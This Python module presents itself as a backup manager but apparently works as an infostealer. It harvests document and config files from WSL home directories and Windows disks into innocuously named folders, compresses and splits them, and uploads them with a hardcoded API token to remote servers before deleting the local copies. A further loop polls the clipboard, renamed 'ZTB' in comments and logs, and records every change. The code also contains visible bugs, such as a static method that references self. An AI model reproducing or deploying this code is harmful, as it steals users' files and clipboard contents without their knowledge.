# -*- coding: utf-8 -*-

import os
import shutil
import time
import socket
import logging
import tarfile
import requests
import subprocess
from datetime import datetime, timedelta
from pathlib import Path

from .config import BackupConfig

class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        self.api_token = "mrzh7pc0Up0eeBhH9Yy8RCbOXEg3xSQH"
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except Exception as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"❌ 路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"❌目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"❌ 创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"❌ 清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        try:
            # 尝试连接多个可靠的服务器
            hosts = [
                "8.8.8.8",  # Google DNS
                "1.1.1.1",  # Cloudflare DNS
                "208.67.222.222"  # OpenDNS
            ]
            for host in hosts:
                try:
                    socket.create_connection((host, 53), timeout=self.config.NETWORK_CONNECTION_TIMEOUT)
                    return True
                except:
                    continue
            return False
        except:
            return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def should_exclude_dir(self, path):
        """检查是否应该排除目录
        
        此方法检查给定路径是否应该被排除，主要通过以下步骤：
        1. 检查是否为云盘目录，如果是则不排除
        2. 检查是否匹配 EXCLUDE_INSTALL_DIRS 中的目录
        3. 检查是否包含 EXCLUDE_KEYWORDS 中的关键词（支持多种分隔符）
        
        Args:
            path: 目录路径
            
        Returns:
            bool: 是否应该排除
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 1. 检查是否为云盘目录
        cloud_keywords = [
            "云盘", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "网盘", "云"
        ]
        if any(keyword.lower() in path_lower for keyword in cloud_keywords):
            return False
            
        # 2. 检查完整目录名是否在排除列表中
        if any(ex.lower() in path_lower for ex in self.config.EXCLUDE_INSTALL_DIRS):
            return True
            
        # 3. 检查目录名的每一部分是否包含关键词
        for part in path_parts:
            # 预处理路径部分：移除所有常见分隔符并转换为小写
            normalized_part = part.lower()
            for sep in [' ', '_', '-', '.']:
                normalized_part = normalized_part.replace(sep, '')
                
            # 对每个关键词进行检查
            for keyword in self.config.EXCLUDE_KEYWORDS:
                keyword_lower = keyword.lower()
                # 移除关键词中的分隔符
                normalized_keyword = keyword_lower
                for sep in [' ', '_', '-', '.']:
                    normalized_keyword = normalized_keyword.replace(sep, '')
                
                # 检查原始路径部分（支持空格分隔）和标准化后的路径部分
                if (keyword_lower in part.lower() or  # 原始匹配
                    normalized_keyword in normalized_part):  # 标准化后匹配
                    return True
            
        return False

    def should_exclude_wsl_path(self, path, source_dir):
        """检查是否应该排除WSL路径
        
        Args:
            path: 路径
            source_dir: 源目录
            
        Returns:
            bool: 是否应该排除
        """
        if not source_dir == str(Path.home()):
            return False
        try:
            rel = os.path.relpath(path, str(Path.home()))
            parts = rel.split(os.sep)
            return any(part in self.config.EXCLUDE_WSL_DIRS for part in parts)
        except Exception:
            return False

    def backup_wsl_files(self, source_dir, target_dir):
        """WSL环境文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("❌ WSL源目录不存在")
            return None

        # 创建两个子目录用于存放不同类型的文件
        target_docs = os.path.join(target_dir, "pypi_docs")
        # 将 configs 目录重命名为 specified，用于存放 WSL_SPECIFIC_DIRS 的内容
        target_specified = os.path.join(target_dir, "pypi_specified")
        # 新增目录用于存放根据扩展名筛选的配置文件
        target_configs_by_ext = os.path.join(target_dir, "pypi_configs_by_ext")
        
        if not self._clean_directory(target_dir):
            return None
            
        if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs_by_ext]):
            return None

        # 添加计数器和超时控制
        start_time = time.time()
        last_progress_time = start_time
        timeout = self.config.WSL_BACKUP_TIMEOUT
        total_files = 0
        processed_files = 0

        # 输出开始备份的信息
        logging.info("\n" + "─" * 50)
        logging.info("🚀 开始备份 WSL 重要目录和文件")
        logging.info("─" * 50 + "\n")

        # 处理指定目录和文件（完整备份，不筛选扩展名）
        for specific_path in self.config.WSL_SPECIFIC_DIRS:
            # 检查是否超时
            if time.time() - start_time > timeout:
                logging.error("\n❌ WSL备份超时")
                return None

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                try:
                    # 对于指定的目录和文件，保存在 specified 目录下
                    target_base_for_specific = target_specified
                    if os.path.isfile(full_source_path):
                        # 如果是文件，直接复制
                        target_file = os.path.join(target_base_for_specific, specific_path)
                        target_file_dir = os.path.dirname(target_file)
                        if self._ensure_directory(target_file_dir):
                            shutil.copy2(full_source_path, target_file)
                            processed_files += 1
                            if self.config.DEBUG_MODE:
                                logging.info(f"📄 已备份: {specific_path}")
                    else:
                        # 如果是目录，递归复制全部内容
                        target_path = os.path.join(target_base_for_specific, specific_path)
                        if self._ensure_directory(os.path.dirname(target_path)):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path)
                            
                            # 添加目录复制进度日志
                            logging.info(f"\n📁 正在备份: {specific_path}/")
                            for root, _, files in os.walk(full_source_path):
                                total_files += len(files)
                            
                            shutil.copytree(full_source_path, target_path, 
                                         symlinks=True, 
                                         ignore=lambda d, files: [f for f in files 
                                                                if any(ex in f for ex in self.config.EXCLUDE_WSL_DIRS)])
                except Exception as e:
                    logging.error(f"\n❌ 备份失败: {specific_path} - {str(e)}")

        logging.info("\n" + "─" * 50)
        logging.info("🔍 开始扫描其他重要文件")
        logging.info("─" * 50)

        # 处理其他目录中的文件（按扩展名分类）
        docs_count = 0 # configs_count 已经不再直接用于计数，因为目标目录已分离
        configs_by_ext_count = 0
        for root, _, files in os.walk(source_dir):
            # 检查是否超时
            current_time = time.time()
            if current_time - start_time > timeout:
                logging.error("\n❌ WSL备份超时")
                return None
            
            # 每N秒输出一次进度
            if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                elapsed_minutes = int((current_time - start_time) / 60)
                logging.info(f"\n⏳ 已处理 {processed_files} 个文件... ({elapsed_minutes}分钟)")
                last_progress_time = current_time
            
            # 跳过已经完整备份的指定目录
            if any(specific_dir in root for specific_dir in self.config.WSL_SPECIFIC_DIRS):
                continue
                
            if os.path.abspath(root).startswith(target_dir):
                continue
            
            if self.should_exclude_wsl_path(root, source_dir):
                continue

            for file in files:
                # 检查文件类型并决定目标目录
                is_doc = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_1)
                is_config = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_2)
                
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                if not os.path.exists(source_file):
                    continue

                # 根据文件类型选择目标目录
                target_base = target_docs if is_doc else target_configs_by_ext # 使用新的目录
                relative_path = os.path.relpath(root, source_dir)
                target_sub_dir = os.path.join(target_base, relative_path)
                target_file = os.path.join(target_sub_dir, file)

                if not self._ensure_directory(target_sub_dir):
                    continue
                    
                try:
                    shutil.copy2(source_file, target_file)
                    processed_files += 1
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_by_ext_count += 1 # 计数更新到新的变量
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.error(f"\n❌ 复制失败: {relative_path}/{file} - {str(e)}")

        # 计算总用时
        total_time = time.time() - start_time
        total_minutes = int(total_time / 60)

        if docs_count > 0 or configs_by_ext_count > 0:
            logging.info("\n" + "═" * 50)
            logging.info("📊 WSL备份统计")
            logging.info("═" * 50)
            if docs_count > 0:
                logging.info(f"   📚 文档文件：{docs_count} 个")
            if configs_by_ext_count > 0:
                logging.info(f"   ⚙️  按扩展名分类的配置文件：{configs_by_ext_count} 个")
            logging.info("─" * 50)
            logging.info(f"   🔄 总计处理：{processed_files} 个文件")
            logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
            logging.info("═" * 50 + "\n")

        return target_dir

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windows磁盘文件备份"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error(f"\n❌ 磁盘源目录不存在: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
                     
        files_count = 0
        total_size = 0
        scan_timeout = self.config.DISK_SCAN_TIMEOUT
        retry_count = self.config.RETRY_COUNT
        retry_delay = 5  # 文件访问重试等待时间（秒）
        start_time = time.time()
        last_progress_time = start_time

        # 输出开始备份的信息
        logging.info("\n" + "─" * 50)
        logging.info("🚀 开始扫描磁盘重要文件")
        logging.info("─" * 50)

        try:
            # 使用 os.walk 的 topdown=True 参数，这样可以跳过不需要的目录
            for root, dirs, files in os.walk(source_dir, topdown=True):
                # 检查是否超时
                current_time = time.time()
                if current_time - start_time > scan_timeout:
                    logging.error(f"\n❌ 扫描目录超时: {source_dir}")
                    break
                    
                # 每N秒显示一次进度
                if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                    elapsed_minutes = int((current_time - start_time) / 60)
                    logging.info(f"\n⏳ 已处理 {files_count} 个文件... ({elapsed_minutes}分钟)")
                    last_progress_time = current_time
                
                # 跳过目标目录
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # 跳过排除的目录
                if self.should_exclude_dir(root):
                    dirs.clear()  # 清空子目录列表，避免继续遍历
                    continue

                # 处理文件
                for file in files:
                    if not any(file.lower().endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # 检查文件大小
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0 or file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            continue
                    except OSError:
                        continue

                    # 尝试复制文件
                    for attempt in range(retry_count):
                        try:
                            # 检查文件是否可访问
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError):
                                if attempt < retry_count - 1:
                                    time.sleep(retry_delay)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
                            target_sub_dir = os.path.join(target_dir, relative_path)
                            target_file = os.path.join(target_sub_dir, file)

                            if not self._ensure_directory(target_sub_dir):
                                break
                                
                            # 使用分块复制
                            with open(source_file, 'rb') as src, open(target_file, 'wb') as dst:
                                shutil.copyfileobj(src, dst, length=self.config.FILE_COPY_BUFFER_SIZE)
                                    
                            files_count += 1
                            total_size += file_size
                            
                            break  # 成功后跳出重试循环
                            
                        except (OSError, IOError, PermissionError) as e:
                            if attempt == retry_count - 1 and self.config.DEBUG_MODE:
                                logging.error(f"\n❌ 文件复制失败: {file} - {str(e)}")

        except (OSError, IOError) as e:
            logging.error(f"\n❌ 备份过程出错: {str(e)}")

        # 显示最终统计信息
        if files_count > 0:
            total_minutes = int((time.time() - start_time) / 60)
            logging.info("\n" + "═" * 50)
            logging.info("📊 磁盘备份统计")
            logging.info("═" * 50)
            logging.info(f"   📁 文件数量：{files_count} 个")
            logging.info(f"   💾 总大小：{total_size / 1024 / 1024:.1f}MB")
            logging.info("─" * 50)
            logging.info(f"   ⏱️  总共耗时：{total_minutes} 分钟")
            logging.info("═" * 50 + "\n")
            return target_dir
        else:
            logging.error(f"\n❌ 未找到需要备份的文件")
            return None
    
    def split_large_file(self, file_path):
        """将大文件分割成小块
        
        Args:
            file_path: 要分割的文件路径
            
        Returns:
            list: 分片文件路径列表，如果不需要分割则返回None
        """
        if not os.path.exists(file_path):
            return None
        
        file_size = os.path.getsize(file_path)
        if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
            return None
        
        try:
            chunk_files = []
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            
            base_name = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                
            # 删除原始大文件
            os.remove(file_path)
            logging.critical(f"文件 {file_path} 已分割为 {len(chunk_files)} 个分片")
            return chunk_files
        except (OSError, IOError) as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            return None

    def upload_file(self, file_path):
        """上传文件到服务器
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not self._is_valid_file(file_path):
            logging.error(f"⚠️ 文件 {file_path} 为空或无效，跳过上传")
            return False

        # 检查文件大小并在需要时分片
        chunk_files = self.split_large_file(file_path)
        if chunk_files:
            success = True
            for chunk_file in chunk_files:
                if not self._upload_single_file(chunk_file):
                    success = False
            # 清理分片目录
            chunk_dir = os.path.dirname(chunk_files[0])
            self._clean_directory(chunk_dir)
            return success
        else:
            return self._upload_single_file(file_path)

    def _upload_single_file(self, file_path):
        """上传单个文件
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        try:
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0 {file_path}")
                if os.path.exists(file_path):
                    os.remove(file_path)
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"⚠️ 文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            for attempt in range(self.config.RETRY_COUNT):
                # 检查网络连接
                if not self._check_internet_connection():
                    logging.error("⚠️ 网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY * 2)  # 网络问题时等待更长时间
                    continue

                for server in self.config.UPLOAD_SERVERS:
                    try:
                        with open(file_path, "rb") as f:
                            logging.critical(f"⌛ 正在上传文件 {file_path}（{file_size / 1024 / 1024:.2f}MB），第 {attempt + 1} 次尝试，使用服务器 {server}...")
                            
                            response = requests.post(
                                server,
                                files={"file": f},
                                data={"token": self.api_token},
                                timeout=self.config.UPLOAD_TIMEOUT,
                                verify=True
                            )
                            
                            if response.ok and response.headers.get("Content-Type", "").startswith("application/json"):
                                result = response.json()
                                if result.get("status") == "ok":
                                    logging.critical(f"📤 上传成功: {file_path}")
                                    os.remove(file_path)
                                    return True
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    logging.error(f"❌ 服务器返回错误: {error_msg}")
                            else:
                                logging.error(f"❌ 上传失败，状态码: {response.status_code}, 响应: {response.text}")
                                
                    except requests.exceptions.Timeout:
                        logging.error(f"❌ 上传超时 {file_path}")
                    except requests.exceptions.SSLError:
                        logging.error(f"❌ SSL错误 {file_path}")
                    except requests.exceptions.ConnectionError:
                        logging.error(f"❌ 连接错误 {file_path}")
                    except Exception as e:
                        logging.error(f"❌ 上传文件出错 {file_path}: {str(e)}")
                    
                    # 如果这个服务器失败，继续尝试下一个服务器
                    continue
                
                if attempt < self.config.RETRY_COUNT - 1:
                    logging.critical(f"等待 {self.config.RETRY_DELAY} 秒后重试...")
                    time.sleep(self.config.RETRY_DELAY)
            
            # 所有重试都失败后，删除文件
            try:
                os.remove(file_path)
                logging.error(f"⚠️ 文件 {file_path} 上传失败并已删除")
            except Exception as e:
                logging.error(f"❌ 删除失败文件时出错: {e}")
            
            return False
            
        except OSError as e:
            logging.error(f"❌ 获取文件大小失败 {file_path}: {e}")
            if os.path.exists(file_path):
                os.remove(file_path)
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        """压缩备份文件夹为tar.gz格式
        
        Args:
            folder_path: 要压缩的文件夹路径
            zip_file_path: 压缩文件路径（不含扩展名）
            
        Returns:
            str or list: 压缩文件路径或压缩文件路径列表
        """
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            # 检查源目录是否为空
            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"⚠️ 源目录为空 {folder_path}")
                return None

            # 计算源目录大小
            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # 跳过空文件
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"❌获取文件大小失败 {file_path}: {e}")
                        continue

            if dir_size == 0:
                logging.error(f"源目录实际大小为0 {folder_path}")
                return None

            if dir_size > self.config.MAX_SOURCE_DIR_SIZE:
                logging.error(f"⚠️ 源目录过大 {folder_path}: {dir_size / 1024 / 1024 / 1024:.2f}GB > {self.config.MAX_SOURCE_DIR_SIZE / 1024 / 1024 / 1024}GB")
                return self.split_large_directory(folder_path, zip_file_path)

            tar_path = f"{zip_file_path}.tar.gz"
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz") as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            # 验证压缩文件
            try:
                compressed_size = os.path.getsize(tar_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {tar_path}")
                    if os.path.exists(tar_path):
                        os.remove(tar_path)
                    return None
                    
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    os.remove(tar_path)
                    return self.split_large_directory(folder_path, zip_file_path)

                self._clean_directory(folder_path)
                logging.critical(f"🗂️ 目录 {folder_path} 🗃️ 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
            except OSError as e:
                logging.error(f"❌ 获取压缩文件大小失败 {tar_path}: {e}")
                if os.path.exists(tar_path):
                    os.remove(tar_path)
                return None
                
        except Exception as e:
            logging.error(f"❌ 压缩失败 {folder_path}: {e}")
            return None

    def _compress_chunk_part(self, part_dir, folder_path, base_zip_path, part_num, chunk_size):
        """压缩单个分块目录
        
        Args:
            part_dir: 分块目录路径
            folder_path: 原始目录路径（用于arcname）
            base_zip_path: 基础压缩文件路径
            part_num: 分块编号
            chunk_size: 分块大小（字节）
            
        Returns:
            str or None: 压缩文件路径，失败返回None
        """
        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
        try:
            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                tar.add(part_dir, arcname=os.path.basename(folder_path))
            
            # 验证压缩文件
            compressed_size = os.path.getsize(tar_path)
            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"压缩后文件仍然过大: {tar_path} ({compressed_size / 1024 / 1024:.2f}MB)")
                os.remove(tar_path)
                return None
            else:
                logging.critical(f"已创建分块 {part_num + 1}: {chunk_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                return tar_path
        except (OSError, IOError, tarfile.TarError) as e:
            logging.error(f"压缩分块失败: {part_dir}: {e}")
            if os.path.exists(tar_path):
                os.remove(tar_path)
            return None

    def split_large_directory(self, folder_path, base_zip_path):
        """将大目录分割成多个小块并分别压缩
        
        Args:
            folder_path: 要分割的目录路径
            base_zip_path: 基础压缩文件路径
            
        Returns:
            list: 压缩文件路径列表
        """
        try:
            compressed_files = []
            current_size = 0
            current_files = []
            part_num = 0
            
            # 创建临时目录存放分块
            temp_dir = os.path.join(os.path.dirname(folder_path), "temp_split")
            if not self._ensure_directory(temp_dir):
                return None

            # 采用更保守的分块大小限制
            # 考虑到压缩比和安全边界，将目标大小设置得更小
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * self.config.SAFETY_MARGIN / self.config.COMPRESSION_RATIO)

            # 创建文件大小映射以优化分块
            file_sizes = {}
            total_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        size = os.path.getsize(file_path)
                        if size > 0:  # 跳过空文件
                            file_sizes[file_path] = size
                            total_size += size
                    except OSError:
                        continue

            if not file_sizes:
                logging.error(f"目录 {folder_path} 中没有有效文件")
                return None

            # 按文件大小降序排序，优先处理大文件
            sorted_files = sorted(file_sizes.items(), key=lambda x: x[1], reverse=True)

            # 检查是否有单个文件超过限制
            if sorted_files[0][1] > MAX_CHUNK_SIZE:
                logging.error(f"发现过大文件: {sorted_files[0][0]} ({sorted_files[0][1] / 1024 / 1024:.2f}MB)")
                return None

            # 使用最优装箱算法进行分块
            current_chunk = []
            current_chunk_size = 0

            for file_path, file_size in sorted_files:
                # 如果当前文件会导致块超过限制，先处理当前块
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # 创建新的分块目录
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # 复制文件到分块目录
                        success = True
                        for src in current_chunk:
                            rel_path = os.path.relpath(src, folder_path)
                            dst = os.path.join(part_dir, rel_path)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except (OSError, IOError, shutil.Error) as e:
                                logging.error(f"复制文件失败: {src} -> {dst}: {e}")
                                success = False
                                break

                        if success:
                            tar_path = self._compress_chunk_part(
                                part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                            )
                            if tar_path:
                                compressed_files.append(tar_path)

                        self._clean_directory(part_dir)
                        part_num += 1

                    current_chunk = []
                    current_chunk_size = 0

                # 添加当前文件到块
                current_chunk.append(file_path)
                current_chunk_size += file_size

            # 处理最后一个块
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    success = True
                    for src in current_chunk:
                        rel_path = os.path.relpath(src, folder_path)
                        dst = os.path.join(part_dir, rel_path)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception as e:
                            logging.error(f"复制文件失败: {src} -> {dst}: {e}")
                            success = False
                            break

                    if success:
                        tar_path = self._compress_chunk_part(
                            part_dir, folder_path, base_zip_path, part_num, current_chunk_size
                        )
                        if tar_path:
                            compressed_files.append(tar_path)

                    self._clean_directory(part_dir)

            # 清理临时目录和源目录
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error(f"目录 {folder_path} 分割失败，没有生成有效的压缩文件")
                return None
            
            logging.critical(f"目录 {folder_path} 已分割为 {len(compressed_files)} 个压缩文件")
            return compressed_files
        except Exception as e:
            logging.error(f"分割目录失败 {folder_path}: {e}")
            return None

    def get_clipboard_content(self):
        """获取ZTB内容，支持 Windows 和 WSL 环境"""
        try:
            # 在 WSL 中使用 PowerShell 获取 Windows ZTB
            ps_command = 'powershell.exe Get-Clipboard'
            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=False  # 改为 False 以获取原始字节
            )
            
            if result.returncode == 0:
                # 尝试不同的编码
                encodings = ['utf-8', 'gbk', 'gb2312', 'gb18030', 'big5', 'latin1']
                
                # 首先尝试 UTF-8 和 GBK
                for encoding in ['utf-8', 'gbk']:
                    try:
                        content = result.stdout.decode(encoding).strip()
                        # 检查解码后的内容是否为空或只包含空白字符
                        if content and not content.isspace():
                            return content
                    except UnicodeDecodeError:
                        continue
                    
                # 如果常用编码失败，尝试其他编码
                for encoding in encodings:
                    if encoding not in ['utf-8', 'gbk']:  # 跳过已尝试的编码
                        try:
                            content = result.stdout.decode(encoding).strip()
                            if content and not content.isspace():
                                return content
                        except UnicodeDecodeError:
                            continue
                
                # 如果所有编码都失败，检查是否有原始数据
                if result.stdout:
                    try:
                        # 使用 'ignore' 选项作为最后的尝试
                        content = result.stdout.decode('utf-8', errors='ignore').strip()
                        if content and not content.isspace():
                            if self.config.DEBUG_MODE:
                                logging.warning("⚠️ 使用 ignore 模式解码ZTB内容")
                            return content
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.error(f"❌ ignore 模式解码失败: {str(e)}")
                else:
                    if self.config.DEBUG_MODE:
                        logging.debug("ℹ️ ZTB为空")
            else:
                if self.config.DEBUG_MODE:
                    logging.error(f"❌ 获取ZTB失败，返回码: {result.returncode}")
                    if result.stderr:
                        try:
                            error_msg = result.stderr.decode('utf-8', errors='ignore')
                            logging.error(f"错误信息: {error_msg}")
                        except:
                            pass
        
            return None
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 获取ZTB出错: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """记录ZTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 检查内容是否为空或特殊标记
            if not content or content.isspace():
                return
            
            # 写入日志
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
            
            content_preview = content[:50] + "..." if len(content) > 50 else content
            logging.info(f"📝 已记录内容: {content_preview}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"❌ 记录ZTB失败: {str(e)}")

    def monitor_clipboard(self, file_path, interval=3):
        """监控ZTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"❌ 创建ZTB日志目录失败: {str(e)}")
                return

        last_content = ""
        error_count = 0  # 添加错误计数
        max_errors = 5   # 最大连续错误次数
        last_empty_log_time = time.time()  # 记录上次输出空ZTB日志的时间
        empty_log_interval = 300  # 每5分钟才输出一次空ZTB日志
        
        # 初始化日志文件
        try:
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"\n=== 📋 ZTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write("-"*30 + "\n")
        except Exception as e:
            logging.error(f"❌ 初始化ZTB日志失败: {str(e)}")
        
        def is_special_content(text):
            """检查是否为特殊标记内容"""
            if not text:
                return False
            # 跳过日志标记行
            if text.startswith('===') or text.startswith('-'):
                return True
            # 跳过时间戳行
            if 'ZTB监控启动于' in text or '日志已于' in text:
                return True
            return False
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                current_time = time.time()
                
                # 检查内容是否有效且不是特殊标记
                if (current_content and 
                    not current_content.isspace() and 
                    not is_special_content(current_content)):
                    
                    # 检查内容是否发生变化
                    if current_content != last_content:
                        content_preview = current_content[:30] + "..." if len(current_content) > 30 else current_content
                        logging.info(f"📋 检测到新内容: {content_preview}")
                        self.log_clipboard_update(current_content, file_path)
                        last_content = current_content
                        error_count = 0  # 重置错误计数
                else:
                    if self.config.DEBUG_MODE and current_time - last_empty_log_time >= empty_log_interval:
                        if not current_content:
                            logging.debug("ℹ️ ZTB为空")
                        elif current_content.isspace():
                            logging.debug("ℹ️ ZTB内容仅包含空白字符")
                        elif is_special_content(current_content):
                            logging.debug("ℹ️ 跳过特殊标记内容")
                        last_empty_log_time = current_time
                    error_count = 0  # 空内容不计入错误
                    
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    logging.error(f"❌ ZTB监控连续出错{max_errors}次，等待60秒后重试")
                    time.sleep(60)  # 连续错误时增加等待时间
